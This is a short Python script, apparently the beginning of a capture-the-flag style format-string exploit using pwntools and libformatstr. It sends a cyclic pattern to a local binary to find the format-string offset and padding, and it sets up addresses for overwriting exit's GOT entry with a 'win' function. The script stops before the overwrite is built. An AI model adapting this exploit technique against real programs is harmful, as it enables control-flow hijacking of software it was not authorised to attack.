from libformatstr import *
from pwn import *
from binascii import *
context.log_level = 'debug'
bufsiz = 100
elf=ELF('./test')
exit_got=0x0002ff70
win_addr=0x565d25fd
bufsiz = 100
r = process('./print_format')
r.sendline(make_pattern(bufsiz))             # send cyclic pattern to
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))